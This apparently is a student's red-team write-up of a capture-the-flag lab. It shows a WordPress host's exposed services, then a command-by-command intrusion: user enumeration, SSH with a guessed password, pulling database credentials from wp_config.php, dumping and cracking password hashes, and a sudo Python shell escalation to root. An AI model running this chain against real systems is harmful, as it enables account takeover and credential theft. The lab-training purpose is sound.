# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:
###### **Command Used:**`$ nmap -sV 192.168.1.110`
![nmap results](Images/nmap_scan.PNG)

This scan identifies the services below as potential points of entry:
##### Target 1:

|   PORT  	| STATE 	|   SERVICE   	|                    VERSION                   	|
|:-------:	|:-----:	|:-----------:	|:--------------------------------------------:	|
|  22/tcp 	|  OPEN 	|     ssh     	| OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 	|
| 80/http 	|  OPEN 	|     http    	|        Apache httpd 2.4.10 ((Debian))        	|
| 111/tcp 	|  OPEN 	|   rpcbind   	|               2-4 (RPC #100000)              	|
| 139/tcp 	|  OPEN 	| netbios-ssn 	|   Samba smbd 3.X-4.X (workgroup: WORKGROUP)  	|
| 445/tcp 	|  OPEN 	| netbios-ssn 	|   Samba smbd 3.X-4.X (workgroup: WORKGROUP)  	|


The following vulnerabilities were identified on each target:
##### Target 1:

|  VULNERABILITY 	| CVE NUMBER 	|   SEVERITY     	|    VULNERABILITY DESCRIPTION                   	|
|:-------:	|:-----:	|:-----------:	|:--------------------------------------------:	|
|  Username Enumeration	|CVE-2017-5487  |     Medium (CVSS Score: 5.3)     	|  Allows for unauthorized actors to access sensitive information without proper authorization.	|
| Weak Password Requirements 	|  CWE-521 	|     Medium-High    | Users lack minimal password requirements which increase the risk of attackers gaining access to accounts within the system.        	|
| Weak Password Encryptions (Salting) 	|     CVE-2020-5229	|   Severe (CVSS Score: 8.1   	|   Using weak or outdated hashing algorithm for storing passwords.            	|
| Exploitation for Privilege Escalation 	|  CVE-2006-0151 | High-Severe	|   The misconfiguration of user priveleages that leads to local users gaining higher privileges by running a Python script.  	|



_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
##### Target 1
The first sensitive document,`flag1.txt`, was found by searching through the page source information of the Service page of the website `http://192.168.1.110/service.html`.
#
![Flag1:Service Page of Website](Images/flag1_website_servicepage.PNG)

Next, the Red Team enumerated the users within the Wordpress site with the WPScan Wordpress Security Scanner.
**Command:**`wpscan --url http://192.168.1.110/wordpress --enumerate u`
#
![WPScan Command](Images/wpscan_cmd.PNG)

This command listed two users within the Wordpress site: `michael` and `steven`.
#
![Users Found](Images/wpscan_users.PNG)

With this information, Michael's account was able to be accessed via SSH due to the simplicity of his password. His password was `michael`.
**Commands:** `ssh michael@192.168.1.110`;`yes`;`michael`

![Access to Michael's Account](Images/ssh_michael.PNG)

Once logged in as Michael, the second sensitive document,`flag2.txt`, was exposed within the /var/www/ directory.

![Flag2](Images/Flag_2.PNG)

The document flag1.txt could be access again by navigating to the /var/www/html directory.
![Flag1:Michael's Account](Images/flag_1.PNG)

From this point, the Red Team navigated to the `wp_config.php` file to obtain the MYSQL database password.
#
![Path to wp_config.php](Images/path_wpconfig.PNG) ![MySQL Database Credentials](Images/MySQL_Creds.PNG)

With the MySQL database credentials, the Red Team was able to extract the password hashes of both Michael and Steven using the following commands:
`mysql -h localhost -u root -pR@v3nSecurity`
#
![MySQL Login](Images/mysql_login.PNG)

`show databases;`;`use wordpress;`;`show tables;`;`SELECT * FROM wp_users;`OR `SELECT ID, user_login, userpass FROM wp_users`
#
![Hashes Only](Images/hashes_only.PNG)
#
![Hashes Only](Images/hashes_verbose.PNG)
#
The hashes were then extracted from MySQL to .txt file located in the /tmp directory.
**Command:**`SELECT * FROM wp_users INTO OUTFILE '/tmp/wp_hashes.txt';`
#
![Hashes Extracted](Images/hashes_to_outputfile.PNG)

Before exiting MySQL, two sensitive pieces of material,`flag3` and `flag4` were found within the wp_posts table.
**Command:**SELECT * FROM wp_posts;
#
![Flag3 and Flag4](Images/flag3_flag4.PNG)

After exiting MySQL, the program John the Ripper (JtR) was then used to decipher the password hash for Steven.
**Command:**`john wp_hashes.txt` OR `john wp_hashes.txt --wordlist=/usr/share/wordlist/rockyou.txt`
#
![JtR](Images/JtR.PNG)
#
![Steven's Password](Images/steven_pwd.PNG)
#
With Steven's credentials, the Red Team was able to access his account and check for his current privelages.
**Commands:**`ssh steven@192.168.1.110`;`yes`;`pink84`;`sudo -l`
#
![Steven's Initial Privelages](Images/steven_initial_privelages.PNG)

Steven's current privelages allowed him to run python scripts. By using the following command, the Red Team was able to escalate his privelages to root.
**Command:**`sudo python -c 'import pty;pty.spawn("/bin/bash")'`;`sudo -l`
#
![Steven's Root Privelages](Images/steven_escalated_privelages.PNG)

By increasing Steven's privelages to root, this allowed for the Red Team to freely move through the website and access or change any file desired. The final sensitive document,`flag4.txt`, was discovered within the root directory.
#
![Flag4.txt](Images/flag4.PNG)